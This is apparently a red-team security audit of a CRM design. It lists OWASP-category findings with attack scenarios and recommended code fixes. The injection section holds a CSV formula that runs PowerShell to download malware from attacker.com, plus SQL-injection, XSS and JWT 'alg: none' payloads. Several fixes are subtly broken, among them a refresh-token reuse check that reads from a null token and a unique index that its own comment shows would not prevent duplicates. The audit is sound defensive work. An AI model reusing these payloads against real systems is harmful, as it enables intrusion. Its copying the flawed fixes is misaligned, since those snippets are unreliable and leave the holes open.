# Red Team Security Audit: CRM V3 Design

**Date:** 2026-03-25
**Scope:** Phase 02-04, 07-08 (Database, Auth, Leads/Customers, Import, Frontend)
**Target System:** NestJS 11 + Next.js 16 + PostgreSQL 16 + Prisma 6
**Environment:** Internal 50-200 user VPS/Docker deployment

---

## Executive Summary

Comprehensive audit identified **12 CRITICAL/HIGH** vulnerabilities in the current design, **8 MEDIUM** risk issues, and **6 LOW/INFO** items. The design demonstrates basic security awareness (bcrypt, JWT, rate limiting, soft deletes) but has significant gaps in:

1. **Access Control** — IDOR patterns, missing compartmentalization checks, field-level permission bypass opportunities
2. **API Key Security** — No expiration enforcement, reuse vulnerability, weak revocation mechanism
3. **Business Logic** — Multiple race conditions, state validation gaps, privilege escalation paths
4. **Data Leakage** — Overly permissive response payloads, error message disclosure
5. **Input Validation** — CSV injection, phone field abuse, insufficient dedup scope

Risks are **ADDRESSABLE in implementation** but must be explicitly coded—they are NOT solved by the framework alone.

---

## OWASP Top 10 Analysis

### A01: Broken Access Control

#### **[CRITICAL] IDOR: Access leads/customers by guessing ID** (NEW)

**Severity:** CRITICAL
**Status:** Not addressed

**Description:**
The design specifies cursor pagination but does NOT define department-based access control. A user can guess sequential BigInt IDs and retrieve any lead/customer via:
```
GET /leads/12345
GET /customers/54321
```

**Attack Scenario:**
1. User A (Sales Dept) logs in, sees lead ID 1001
2. User A queries `GET /leads/1002, 1003, 1004...` via rapid requests
3. All succeed because no ownership check is enforced in controller

**Recommended Fix:**
- Implement department-based access filter in ALL entity retrieval:
  ```typescript
  // leads.controller.ts
  @Get(':id')
  async getLeadDetail(@Param('id', ParseBigIntPipe) id: bigint, @CurrentUser() user: User) {
    const lead = await this.leadsService.findById(id);

    // MUST verify ownership before returning
    if (lead.department_id !== user.department_id && user.role !== UserRole.SUPER_ADMIN) {
      throw new ForbiddenException('No access to this lead');
    }
    return lead;
  }
  ```
- For managers: can see dept they manage + leads assigned to their team
- For users: can see only leads assigned to them
- Apply same pattern to: customers, orders, activities, call logs

---

#### **[CRITICAL] Missing Lead Dedup Scope Validation** (NEW)

**Severity:** CRITICAL
**Status:** Partially addressed (design mentions dedup check, not scope)

**Description:**
Phase 04 specifies: "dedup check (phone + source)" but DOES NOT validate that user cannot dedup across departments. Attacker can create lead with phone already in another department's pool to trigger false dedup.

**Attack Scenario:**
1. User A (Sales) creates lead for phone +84912345678, source "Website"
2. User B (Support) creates lead for same phone from their department
3. Dedup check only by phone+source, not by department
4. User B's create returns "already exists" error with lead ID from User A's department
5. User B learns about leads in other departments via error message

**Recommended Fix:**
```typescript
// leads.service.ts - CORRECTED
async create(dto: CreateLeadDto, currentUser: User) {
  const normalized = normalizePhone(dto.phone);

  // Dedup must be SCOPED to department
  const existing = await this.leadsRepository.findOne({
    phone: normalized,
    source_id: dto.sourceId,
    department_id: currentUser.departmentId,  // KEY: scope to dept
    deleted_at: null
  });

  if (existing) {
    throw new ConflictException(`Lead already exists in your department: ${existing.id}`);
  }
  // ... create
}
```

---

#### **[HIGH] Mass Assignment: User can escalate role via PATCH endpoint** (NEW)

**Severity:** HIGH
**Status:** Not explicitly addressed

**Description:**
Phase 03 CRUD says `PATCH /users/:id` allows "super_admin or self for limited fields" but does NOT specify which fields are "limited". If implementation copies ALL DTO fields without filtering:

```typescript
// VULNERABLE
@Patch(':id')
async updateUser(@Param('id') id: bigint, @Body() dto: UpdateUserDto) {
  return this.usersService.update(id, dto);
}
```

Attacker patches own user:
```json
{
  "name": "John",
  "role": "SUPER_ADMIN"  // escalates self!
}
```

**Recommended Fix:**
```typescript
// users.service.ts
async update(id: bigint, dto: UpdateUserDto, currentUser: User) {
  const target = await this.findById(id);

  // Only self or super_admin can update
  if (target.id !== currentUser.id && currentUser.role !== UserRole.SUPER_ADMIN) {
    throw new ForbiddenException();
  }

  // WHITELIST allowed fields per role
  const allowedFields = {
    [UserRole.USER]: ['name', 'phone'], // no email, role, department
    [UserRole.MANAGER]: ['name', 'phone'],
    [UserRole.SUPER_ADMIN]: ['*'] // all fields
  };

  // Filter DTO to only allowed fields
  const filtered = {};
  for (const field of allowedFields[currentUser.role]) {
    if (dto[field] !== undefined) {
      filtered[field] = dto[field];
    }
  }

  return this.update(id, filtered);
}
```

---

#### **[HIGH] Department Manager Privilege Escalation** (NEW)

**Severity:** HIGH
**Status:** Not addressed

**Description:**
Phase 02 introduces `ManagerDepartment` junction table for manager-department relationships. Design does NOT verify that:
1. User can only assign leads to users in their managed department
2. Manager cannot edit another manager's department via creative lead assignment

**Attack Scenario:**
1. Manager A of Sales Dept attempts: `POST /leads/:id/assign { userId: 999 }`
2. User 999 is in Support Dept (not Sales)
3. If assignment check only validates "user exists", assignment succeeds
4. Lead now shows in Support without Support manager's knowledge

**Recommended Fix:**
```typescript
// leads.service.ts
async assignLead(leadId: bigint, userId: bigint, currentUser: User) {
  const lead = await this.leadsRepository.findById(leadId);
  const targetUser = await this.usersRepository.findById(userId);

  // Verify assigner is manager of THIS department
  if (currentUser.role !== UserRole.SUPER_ADMIN) {
    const managerDepts = await this.managerDepartmentRepository.findByManager(currentUser.id);
    const managedDeptIds = managerDepts.map(md => md.departmentId);

    if (!managedDeptIds.includes(lead.departmentId)) {
      throw new ForbiddenException('Cannot assign leads outside your departments');
    }
  }

  // Verify target user is in same department
  if (targetUser.departmentId !== lead.departmentId) {
    throw new BadRequestException('Cannot assign to user in different department');
  }

  // ... assign
}
```

---

#### **[HIGH] Deleted User Account Can Still Claim/Receive Assignments** (NEW)

**Severity:** HIGH
**Status:** Not addressed

**Description:**
Phase 02 uses soft deletes (`deleted_at` IS NOT NULL). Phase 03 auth correctly filters `soft-deleted users` from login. BUT:
- If lead is assigned to User ID 42 before User 42 is soft-deleted
- User 42 is now inactive but leads still point to `assigned_user_id = 42`
- API queries don't auto-filter deleted users from assignment relations
- Orphaned leads appear to be "assigned" to ghost user

**Attack Scenario:**
1. Manager A assigns 100 leads to User B
2. User B is fired, User B record soft-deleted
3. GET /leads returns `assigned_user_id: <B's ID>` with no user name (FK still exists)
4. API serialization breaks or returns `assigned_user: null`
5. Supervisor reassigns, but database still has dangling FK

**Recommended Fix:**
```prisma
// schema.prisma
model Lead {
  id          BigInt
  assignedUserId  BigInt?  @map("assigned_user_id")

  // Add relation with explicit filter
  assignedUser    User?    @relation(fields: [assignedUserId], references: [id])

  @@map("leads")
}
```

In queries, ALWAYS include explicit `where deleted_at IS NULL`:
```typescript
// leads.repository.ts
async findById(id: bigint) {
  return this.prisma.lead.findFirst({
    where: {
      id,
      deletedAt: null,  // Filter deleted leads
      assignedUser: { deletedAt: null }  // Filter deleted assigned user
    },
    include: {
      assignedUser: true,
      // ... other relations, all with explicit deletedAt: null
    }
  });
}
```

---

#### **[MEDIUM] Customer Edit: Non-Manager Can Change Department via Indirect Update** (NEW)

**Severity:** MEDIUM
**Status:** Not addressed

**Description:**
Phase 04 mentions "Field-level permission: phone number can only be edited by MANAGER+" but does NOT mention other fields. If a customer has `assigned_department_id`, a regular user via PATCH might change it.

**Recommended Fix:**
```typescript
// customers.service.ts
async update(id: bigint, dto: UpdateCustomerDto, currentUser: User) {
  const customer = await this.findById(id);

  if (currentUser.role !== UserRole.SUPER_ADMIN) {
    // Regular users can only edit name/email, NOT phone or department
    if (dto.phone || dto.assignedDepartmentId) {
      throw new ForbiddenException('Insufficient permissions');
    }
  }

  return this.prisma.customer.update({
    where: { id },
    data: sanitizeDto(dto, currentUser.role)
  });
}
```

---

### A02: Cryptographic Failures

#### **[HIGH] API Key Reuse Attack: No Expiration Enforcement** (NEW)

**Severity:** HIGH
**Status:** Partial (design mentions `expiresAt` field but no enforcement logic)

**Description:**
Phase 02 defines `expiresAt` on ApiKey model. Phase 07 mentions "expiration dates" in mitigation but DOES NOT specify when/how expiration is checked. If 3rd party API calls don't validate expiration:

```typescript
// VULNERABLE: checks only isActive
const apiKey = await prisma.apiKey.findUnique({
  where: { keyHash }
});

if (!apiKey || !apiKey.isActive) {
  throw new Unauthorized('Invalid API key');
}
// Missing: if (apiKey.expiresAt < now()) throw Unauthorized();
```

Expired keys continue working indefinitely.

**Recommended Fix:**
```typescript
// api-key.guard.ts
async validate(keyString: string): Promise<ApiKey> {
  const hash = sha256(keyString);
  const apiKey = await this.prisma.apiKey.findUnique({
    where: { keyHash: hash }
  });

  if (!apiKey) throw new UnauthorizedException('Invalid API key');
  if (!apiKey.isActive) throw new UnauthorizedException('API key disabled');

  // CRITICAL: Check expiration
  if (apiKey.expiresAt && apiKey.expiresAt < new Date()) {
    throw new UnauthorizedException('API key expired');
  }

  // Log usage
  await this.prisma.apiKey.update({
    where: { id: apiKey.id },
    data: { lastUsedAt: new Date() }
  });

  return apiKey;
}
```

---

#### **[HIGH] Refresh Token Reuse Not Detected if Family ID Compromised** (NEW)

**Severity:** HIGH
**Status:** Partial (design mentions family-based rotation, implementation unclear)

**Description:**
Phase 03 specifies `familyId` for token reuse detection but DOES NOT define what "reuse detection" means in code. If:
1. Attacker steals a refresh token (family=ABC123)
2. Legitimate user and attacker both try to refresh with same family token
3. Whichever request hits first wins, other gets new token with same familyId
4. No alarm raised, no other tokens revoked

**Attack Scenario:**
1. User logs in, gets refresh token family=ABC, token_hash=XYZ
2. Session hijacking: attacker gets token
3. User tries to refresh: hits endpoint first, gets new pair (family=ABC, new_hash=XYZ2)
4. Attacker's old token fails with "not found" error—silent, no alert
5. Attacker retries with stolen token, gets error, stays quiet
6. Admin has no way to know account was compromised

**Recommended Fix:**
```typescript
// auth.service.ts
async refreshTokens(refreshToken: string, currentUser: User) {
  const hash = sha256(refreshToken);
  const storedToken = await this.prisma.refreshToken.findUnique({
    where: { tokenHash: hash }
  });

  if (!storedToken) {
    // Potential theft: check if ANY token in this family is revoked
    const familyTokens = await this.prisma.refreshToken.findMany({
      where: { familyId: storedToken?.familyId } // if we know it
    });

    // If family tokens exist and one is revoked, log security event
    if (familyTokens.some(t => t.revokedAt)) {
      // Log potential session hijacking
      await this.logger.error('Token reuse detected', {
        userId: currentUser.id,
        familyId: familyTokens[0]?.familyId,
        attempt: 'reuse_of_revoked_token'
      });

      // REVOKE ENTIRE FAMILY
      await this.prisma.refreshToken.updateMany({
        where: { familyId: familyTokens[0].familyId },
        data: { revokedAt: new Date() }
      });

      throw new UnauthorizedException('Session compromised. Please login again.');
    }

    throw new UnauthorizedException('Invalid refresh token');
  }

  if (storedToken.revokedAt) {
    throw new UnauthorizedException('Refresh token revoked');
  }

  if (storedToken.expiresAt < new Date()) {
    throw new UnauthorizedException('Refresh token expired');
  }

  // Revoke old token
  await this.prisma.refreshToken.update({
    where: { id: storedToken.id },
    data: { revokedAt: new Date() }
  });

  // Issue new family
  const newFamilyId = randomUUID();
  const newAccessToken = this.generateAccessToken(currentUser);
  const newRefreshToken = this.generateRefreshToken(currentUser, newFamilyId);

  await this.prisma.refreshToken.create({
    data: {
      userId: currentUser.id,
      tokenHash: sha256(newRefreshToken),
      familyId: newFamilyId,
      expiresAt: add(new Date(), { days: 7 })
    }
  });

  return { access_token: newAccessToken, refresh_token: newRefreshToken };
}
```

---

#### **[MEDIUM] Password Hash Cost Not Documented as Enforced** (NEW)

**Severity:** MEDIUM
**Status:** Documented but not enforced in implementation

**Description:**
Phase 03 says "bcrypt cost factor 12" but does NOT specify:
- Is this a NestJS global setting enforced in a pipe?
- Or is it hardcoded in AuthService?
- What if someone later changes it to cost=4 by accident?

**Recommended Fix:**
```typescript
// auth.service.ts - at top level
private readonly BCRYPT_ROUNDS = 12;

async hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, this.BCRYPT_ROUNDS);
}

// Add validation
async comparePasswords(password: string, hash: string): Promise<boolean> {
  // Validate that hash actually used cost 12+
  const rounds = extractRoundsFromHash(hash); // $2b$12$...
  if (rounds < 12) {
    this.logger.warn('Password hash uses insufficient rounds', { rounds });
  }
  return bcrypt.compare(password, hash);
}
```

---

#### **[MEDIUM] JWT Algorithm Not Specified, Allows Downgrade** (NEW)

**Severity:** MEDIUM
**Status:** Not addressed

**Description:**
Phase 03 specifies JWT but does NOT mandate algorithm. NestJS Passport allows algorithm confusion:
```typescript
// VULNERABLE: allows attacker to use "none" algorithm
const secret = process.env.JWT_SECRET;
passport.use(new JwtStrategy({
  secretOrKey: secret,
  // Missing: algorithms: ['HS256']
}));
```

Attacker creates token with `alg: "none"` (no signature) and bypasses validation.

**Recommended Fix:**
```typescript
// jwt.strategy.ts
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor() {
    super({
      jwtFromRequest: extractJwtFromAuthHeader(),
      secretOrKey: process.env.JWT_SECRET,
      algorithms: ['HS256'], // MUST be explicit, no "none"
      ignoreExpiration: false // MUST validate expiry
    });
  }
}
```

---

### A03: Injection

#### **[CRITICAL] CSV Injection: Malicious Formulas in Import** (NEW)

**Severity:** CRITICAL
**Status:** Not addressed

**Description:**
Phase 07 specifies CSV import but DOES NOT sanitize cell content. Attacker uploads CSV:

```csv
name,phone,source
John,=cmd|'/C calc'!A0,Website
Jane,=1+1,Referral
```

When imported lead is exported and opened in Excel:
1. Excel interprets `=` as formula
2. Executes arbitrary command
3. Spreadsheet becomes attack vector

**Attack Scenario:**
1. Attacker uploads CSV with `=cmd|'/C powershell Invoke-WebRequest http://attacker.com/malware.ps1'!A0`
2. Lead is created with name containing formula
3. Manager exports leads list
4. Opens in Excel → formula executes → machine compromised

**Recommended Fix:**
```typescript
// leads.service.ts - during import
sanitizeCSVField(value: string): string {
  // Reject cells that start with dangerous characters
  if (value && ['=', '+', '-', '@', '\t', '\r'].includes(value[0])) {
    return `'${value}`; // Prepend single quote to prevent formula
  }
  return value;
}

// import.processor.ts
for (const row of csvRows) {
  const sanitized = {
    name: this.sanitizeCSVField(row.name),
    phone: this.sanitizeCSVField(row.phone),
    email: this.sanitizeCSVField(row.email)
  };
  // ... create lead with sanitized data
}
```

For export, same principle:
```typescript
// export.service.ts
generateCSV(leads: Lead[]) {
  const rows = leads.map(lead => ({
    name: this.sanitizeCSVField(lead.name),
    phone: this.sanitizeCSVField(lead.phone)
  }));
  return csvStringify(rows);
}
```

---

#### **[CRITICAL] SQL Injection via Raw Prisma Queries** (NEW)

**Severity:** CRITICAL
**Status:** Addressed in documentation, must be enforced in code

**Description:**
Phase 03 explicitly warns:
```
SQL injection prevention: ALL raw Prisma queries MUST use tagged template literals
✅ prisma.$queryRaw\`SELECT * FROM leads WHERE name ILIKE ${'%' + search + '%'}\`
❌ prisma.$queryRaw(\`SELECT * FROM leads WHERE name ILIKE '%${search}%'\`)
```

But does NOT specify HOW to enforce this in code review. If developer forgets:

```typescript
// VULNERABLE in leads.repository.ts
async searchByName(query: string) {
  return this.prisma.$queryRaw(`
    SELECT * FROM leads WHERE name ILIKE '%${query}%'
  `);
}
```

Attacker sends `query = "%' OR 1=1--"` and extracts all leads.

**Recommended Fix:**
1. Use tagged templates only (enforce via ESLint):
```typescript
// eslint.config.js
{
  rules: {
    'no-template-literals-in-raw-queries': 'error' // custom rule
  }
}
```

2. In code:
```typescript
// leads.repository.ts
async searchByName(query: string) {
  // CORRECT: uses tagged template, auto-parameterized
  return this.prisma.$queryRaw`
    SELECT * FROM leads WHERE name ILIKE ${'%' + query + '%'}
  `;
}
```

3. Alternative: use Prisma's built-in search:
```typescript
async searchByName(query: string) {
  return this.prisma.lead.findMany({
    where: {
      OR: [
        { name: { contains: query, mode: 'insensitive' } },
        { phone: { contains: query, mode: 'insensitive' } }
      ]
    }
  });
}
```

---

#### **[HIGH] Phone Field Injection: No Type Validation** (NEW)

**Severity:** HIGH
**Status:** Partially addressed (normalization defined, validation type not specified)

**Description:**
Phase 04 specifies phone normalization but does NOT validate that phone is numeric after normalization. Attacker submits:
```json
{
  "phone": "+84<script>alert('xss')</script>9123456789"
}
```

If normalization only strips spaces/dashes but doesn't validate characters:
1. Phone stored as mixed text
2. When rendered in UI without escaping → XSS
3. Or used in database query → potential injection

**Recommended Fix:**
```typescript
// phone.ts
export function normalizePhone(input: string): string {
  if (!input) return '';

  // Strip whitespace, dashes, dots
  let cleaned = input.replace(/[\s\-.()+]/g, '');

  // Convert +84 to 0
  if (cleaned.startsWith('84')) {
    cleaned = '0' + cleaned.slice(2);
  }

  // VALIDATE: must be 10-11 digits only
  if (!/^\d{10,11}$/.test(cleaned)) {
    throw new BadRequestException(`Invalid phone format: ${cleaned}`);
  }

  return cleaned;
}

// In DTOs
export class CreateLeadDto {
  @IsString()
  phone: string;

  @Validate(IsPhoneValidator)
  phoneValidation: true;
}

// Validator
@ValidatorConstraint()
export class IsPhoneValidator implements ValidatorConstraintInterface {
  validate(value: string) {
    try {
      normalizePhone(value);
      return true;
    } catch {
      return false;
    }
  }
}
```

---

#### **[MEDIUM] Label Name Not Escaped in Response** (NEW)

**Severity:** MEDIUM
**Status:** Not addressed

**Description:**
Phase 04 allows users to create labels with custom names. If API response includes label names without encoding:

```json
{
  "id": 1,
  "name": "<img src=x onerror=alert('xss')>"
}
```

Frontend renders this in React (JSX auto-escapes) OR in CSV export (vulnerable).

**Recommended Fix:**
- In NestJS API: label names stored as-is (no encoding at DB level)
- In response serialization: no special encoding needed if frontend is React (JSX escapes)
- In CSV export: sanitize like CSV injection (prepend quote)
- Add validation: label names max 50 chars, no control characters
```typescript
export class CreateLabelDto {
  @IsString()
  @MaxLength(50)
  @Matches(/^[a-zA-Z0-9\s\-_]*$/) // alphanumeric, dash, underscore only
  name: string;
}
```

---

### A04: Insecure Design

#### **[CRITICAL] Race Condition: Double Assignment of Same Lead** (NEW)

**Severity:** CRITICAL
**Status:** Acknowledged in design but not implemented

**Description:**
Phase 04 mentions "Optimistic locking for assignment (prevent double-assign race condition)" but does NOT show implementation. If two managers simultaneously assign the same unassigned lead:

```
Manager A: POST /leads/1000/assign { userId: 101 }
Manager B: POST /leads/1000/assign { userId: 102 }
```

Without optimistic locking, both succeed (one overwrites the other):
1. First request updates lead: `assigned_user_id = 101`
2. Second request updates same lead: `assigned_user_id = 102`
3. Lead assigned twice, assignment_history shows both
4. System state inconsistent

**Recommended Fix:**
```typescript
// leads.schema.prisma
model Lead {
  id            BigInt
  assignedUserId  BigInt?
  version       Int     @default(0) // Optimistic lock

  @@map("leads")
}

// leads.service.ts
async assignLead(leadId: bigint, userId: bigint, currentUser: User) {
  const lead = await this.findById(leadId);

  // Verify still unassigned
  if (lead.assignedUserId !== null) {
    throw new ConflictException('Lead already assigned');
  }

  // Optimistic lock: update fails if version changed
  const updated = await this.prisma.lead.updateMany({
    where: {
      id: leadId,
      version: lead.version, // Must match or update returns 0 rows
      assignedUserId: null    // Still unassigned
    },
    data: {
      assignedUserId: userId,
      status: LeadStatus.ASSIGNED,
      version: { increment: 1 } // Bump version
    }
  });

  if (updated.count === 0) {
    throw new ConflictException('Lead assignment failed (already assigned or changed)');
  }

  // ... create history
}
```

---

#### **[CRITICAL] Race Condition: Double Claim of Customer** (NEW)

**Severity:** CRITICAL
**Status:** Not addressed

**Description:**
Customer "claim" not explicitly mentioned in design, but implied via lead→customer conversion. If two leads convert to same customer:

```
Lead A: POST /leads/1/convert
Lead B: POST /leads/2/convert (same phone, auto-links to same customer)
```

Both might create customer records or link to same customer without coordination:
1. Lead A creates customer for phone +84912345678
2. Lead B searches for customer with same phone, finds it
3. Both leads now point to same customer
4. Orders might be duplicated or mixed up

**Recommended Fix:**
```typescript
// customers.service.ts
async findOrCreateByPhone(phone: string, data: CreateCustomerDto) {
  const normalized = normalizePhone(phone);

  // First attempt: find existing
  let customer = await this.prisma.customer.findFirst({
    where: { phone: normalized, deletedAt: null }
  });

  if (customer) {
    return customer;
  }

  // Create with race condition check
  try {
    customer = await this.prisma.customer.create({
      data: {
        phone: normalized,
        name: data.name,
        email: data.email,
        assignedDepartmentId: data.departmentId
      }
    });
    return customer;
  } catch (error) {
    if (error.code === 'P2002') { // unique constraint violation
      // Another request created it, fetch and return
      return this.prisma.customer.findFirst({
        where: { phone: normalized, deletedAt: null }
      });
    }
    throw error;
  }
}
```

And add unique index:
```prisma
model Customer {
  phone         String
  deletedAt     DateTime?

  @@unique([phone, deletedAt]) // PostgreSQL allows multiple NULLs
  @@map("customers")
}
```

---

#### **[HIGH] Lead Status Transition Not Validated Against State Machine** (NEW)

**Severity:** HIGH
**Status:** Design mentions state machine but no enforcement specified

**Description:**
Phase 04 shows allowed transitions:
```
POOL → ASSIGNED → IN_PROGRESS → CONVERTED/LOST/TRANSFERRED
```

But does NOT enforce that only allowed transitions succeed. If implementation simply allows any status change:

```typescript
// VULNERABLE
@Patch(':id/status')
async changeStatus(@Param('id') id: bigint, @Body() dto: { status: LeadStatus }) {
  return this.leadsService.update(id, { status: dto.status });
}
```

Attacker can:
- Jump POOL → CONVERTED without assigning
- Change LOST → CONVERTED
- Bypass workflow entirely

**Recommended Fix:**
```typescript
// leads.service.ts
private readonly VALID_TRANSITIONS = {
  [LeadStatus.POOL]: [LeadStatus.ASSIGNED, LeadStatus.LOST],
  [LeadStatus.ASSIGNED]: [LeadStatus.IN_PROGRESS, LeadStatus.TRANSFERRED, LeadStatus.LOST],
  [LeadStatus.IN_PROGRESS]: [LeadStatus.CONVERTED, LeadStatus.LOST, LeadStatus.TRANSFERRED],
  [LeadStatus.CONVERTED]: [], // Terminal
  [LeadStatus.LOST]: [LeadStatus.ASSIGNED], // Can re-open
  [LeadStatus.TRANSFERRED]: [LeadStatus.IN_PROGRESS]
};

async changeStatus(id: bigint, newStatus: LeadStatus, currentUser: User) {
  const lead = await this.findById(id);

  const allowed = this.VALID_TRANSITIONS[lead.status];
  if (!allowed.includes(newStatus)) {
    throw new BadRequestException(
      `Cannot transition from ${lead.status} to ${newStatus}. Allowed: ${allowed.join(', ')}`
    );
  }

  // Additional validation
  if (newStatus === LeadStatus.ASSIGNED && !lead.assignedUserId) {
    throw new BadRequestException('Cannot mark as ASSIGNED without assigning to user');
  }

  return this.prisma.lead.update({
    where: { id },
    data: { status: newStatus }
  });
}
```

---

#### **[HIGH] Import with Duplicate Phones Overwrites Without Warning** (NEW)

**Severity:** HIGH
**Status:** Design mentions dedup check, not merge strategy

**Description:**
Phase 07 specifies "Validation: dedup check per row" but does NOT specify merge strategy. If CSV has duplicate phone with different data:

```csv
phone,name,email,source
0912345678,John Doe,john@example.com,Website
0912345678,Jane Smith,jane@example.com,Facebook
```

Does the import:
1. Skip 2nd row (error)?
2. Merge data?
3. Create both anyway?

Design is ambiguous. If implementation creates both, dedup fails. If it skips, user data loss without notice.

**Recommended Fix:**
```typescript
// import.processor.ts
async processRow(row: any): Promise<{ success: boolean; error?: string }> {
  const phone = normalizePhone(row.phone);
  const source = await this.leadsService.findSourceByName(row.source);

  // Check for dedup WITHIN THIS IMPORT
  if (this.importedPhones.has(`${phone}|${source.id}`)) {
    return {
      success: false,
      error: `Duplicate phone in this import: ${phone}`
    };
  }
  this.importedPhones.add(`${phone}|${source.id}`);

  // Check against existing database
  const existing = await this.leadsService.findByPhoneAndSource(phone, source.id);
  if (existing) {
    return {
      success: false,
      error: `Phone already exists (Lead ID: ${existing.id}). Skipped.`
    };
  }

  // Create lead
  try {
    await this.leadsService.create({
      phone,
      name: row.name,
      email: row.email,
      sourceId: source.id
    });
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
}
```

And include in error report which rows were skipped due to duplicates.

---

### A05: Security Misconfiguration

#### **[CRITICAL] CORS Not Restricted: Wildcard Origin Vulnerability** (NEW)

**Severity:** CRITICAL
**Status:** Partially addressed (FRONTEND_URL env var mentioned, implementation unclear)

**Description:**
Phase 03 shows:
```typescript
app.enableCors({
  origin: process.env.FRONTEND_URL || 'http://localhost:3000',
  credentials: true,
});
```

Risk: If `FRONTEND_URL` is NOT set or misconfigured, default is localhost—but in production, this might be an attacker domain. Also, if anyone later changes it to `true` (wildcard):

```typescript
// DANGEROUS
app.enableCors({
  origin: true, // allows ANY origin
  credentials: true
});
```

Attacker domain can make requests with user's credentials.

**Recommended Fix:**
```typescript
// main.ts
const allowedOrigins = (process.env.CORS_ORIGINS || 'http://localhost:3000').split(',');

if (allowedOrigins.includes('*') || allowedOrigins.includes(true)) {
  throw new Error('CORS wildcard not allowed in production');
}

app.enableCors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
});
```

And validate at startup:
```typescript
if (!process.env.CORS_ORIGINS) {
  throw new Error('CORS_ORIGINS env var must be set');
}

if (process.env.NODE_ENV === 'production' && process.env.CORS_ORIGINS.includes('localhost')) {
  throw new Error('localhost in CORS origins not allowed in production');
}
```

---

#### **[HIGH] JWT Secret Not Enforced as Strong** (NEW)

**Severity:** HIGH
**Status:** Not addressed

**Description:**
Phase 03 says "JWT secrets in env vars, never hardcoded" but does NOT validate strength. If admin sets:
```
JWT_SECRET=secret123
```

Attacker brute-forces the secret and forges any token.

**Recommended Fix:**
```typescript
// app.module.ts
export class AppModule {
  constructor(private configService: ConfigService) {
    const jwtSecret = this.configService.get('JWT_SECRET');
    if (!jwtSecret || jwtSecret.length < 32) {
      throw new Error('JWT_SECRET must be at least 32 characters');
    }
  }
}
```

And in deployment:
```bash
# .env.production validation
if [ -z "$JWT_SECRET" ] || [ ${#JWT_SECRET} -lt 32 ]; then
  echo "FATAL: JWT_SECRET invalid"; exit 1
fi
```

---

#### **[HIGH] No Rate Limiting on POST /imports/leads (DOS Attack)** (NEW)

**Severity:** HIGH
**Status:** Rate limiting mentioned for auth + 3rd party API, NOT imports

**Description:**
Phase 07 specifies:
- Auth endpoints: 5 req/min per IP
- Authenticated API: 100 req/min per user
- 3rd party API: 100 req/min per API key

But does NOT mention rate limiting on `/imports/leads`. Attacker authenticated as manager can upload 10MB CSV files back-to-back, causing:
1. Redis/BullMQ queue bloat
2. Database connection saturation
3. Server memory spike
4. DOS

**Recommended Fix:**
```typescript
// import.controller.ts
@UseGuards(JwtAuthGuard, RolesGuard)
@Roles(UserRole.MANAGER, UserRole.SUPER_ADMIN)
@Throttle({ default: { limit: 5, ttl: 60_000 } }) // 5 uploads per minute
@Post('leads')
async uploadLeadsCsv(@UploadedFile() file: Express.Multer.File) {
  // ...
}
```

Or use custom guard:
```typescript
@Throttle({ limit: 3, ttl: 60_000 }) // 3 imports per minute
```

---

#### **[MEDIUM] No Security Headers Configured** (NEW)

**Severity:** MEDIUM
**Status:** Not addressed

**Description:**
NestJS does not automatically add security headers (Content-Security-Policy, X-Frame-Options, etc.). These should be configured in main.ts.

**Recommended Fix:**
```typescript
// main.ts
import helmet from '@nestjs/helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", 'data:', 'https:']
    }
  },
  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true
  },
  frameguard: { action: 'deny' },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' }
}));
```

---

#### **[MEDIUM] Error Messages Expose System Details** (NEW)

**Severity:** MEDIUM
**Status:** Partially addressed (exception filter mentioned, specifics unclear)

**Description:**
Phase 03 mentions "http-exception.filter.ts: standardize error responses" but does NOT specify what details to strip. If implementation returns:

```json
{
  "statusCode": 500,
  "message": "Error: connect ECONNREFUSED 127.0.0.1:5432",
  "error": "Internal Server Error"
}
```

Attacker learns:
- Database IP/port
- Stack trace
- Internal architecture

**Recommended Fix:**
```typescript
// common/filters/http-exception.filter.ts
@Catch()
export class AllExceptionsFilter implements ExceptionFilter {
  catch(exception: unknown, host: HttpArgumentsCollection) {
    const response = host.switchToHttp().getResponse<Response>();
    const request = host.switchToHttp().getRequest<Request>();

    let statusCode = 500;
    let message = 'Internal Server Error';
    let error = undefined;

    if (exception instanceof HttpException) {
      statusCode = exception.getStatus();
      const exceptionResponse = exception.getResponse();

      if (typeof exceptionResponse === 'object') {
        message = exceptionResponse.message || message;
        error = exceptionResponse.error || undefined;
      } else {
        message = exceptionResponse;
      }
    } else {
      // Log full error internally, never expose to client
      this.logger.error('Unhandled exception', exception);
      // Don't include details in response
    }

    // NEVER expose stack trace, connection strings, query, etc.
    response.status(statusCode).json({
      statusCode,
      message,
      // error: undefined (strip it)
      timestamp: new Date().toISOString(),
      path: request.url
    });
  }
}
```

---

### A06: Vulnerable and Outdated Components

#### **[MEDIUM] No Dependency Security Audit Specified** (NEW)

**Severity:** MEDIUM
**Status:** Not addressed

**Description:**
Design does not mention:
1. How to audit npm packages for vulnerabilities
2. When to update dependencies
3. What to do if critical CVE is published

---

#### **[MEDIUM] BullMQ Redis Connection Not Secured** (NEW)

**Severity:** MEDIUM
**Status:** Not addressed

**Description:**
Phase 07 adds Redis to docker-compose but does NOT specify:
1. Is Redis password-protected?
2. Is Redis on a private network only?
3. What if network attacker accesses Redis directly?

**Recommended Fix:**
```yaml
# docker-compose.yml
redis:
  image: redis:7
  command: redis-server --requirepass ${REDIS_PASSWORD}
  ports:
    - "127.0.0.1:6379:6379" # Bind to localhost only
  networks:
    - internal # Private network, not exposed
```

And in NestJS:
```typescript
// app.module.ts
BullModule.forRoot({
  connection: {
    host: process.env.REDIS_HOST,
    port: parseInt(process.env.REDIS_PORT),
    password: process.env.REDIS_PASSWORD // Must set
  }
})
```

---

### A07: Identification and Authentication Failures

#### **[HIGH] No User Enumeration Protection on Login** (NEW)

**Severity:** HIGH
**Status:** Partially addressed (design says "same error for wrong email vs wrong password", not implemented)

**Description:**
Phase 03 mentions:
```
No user enumeration: same error for wrong email vs wrong password
```

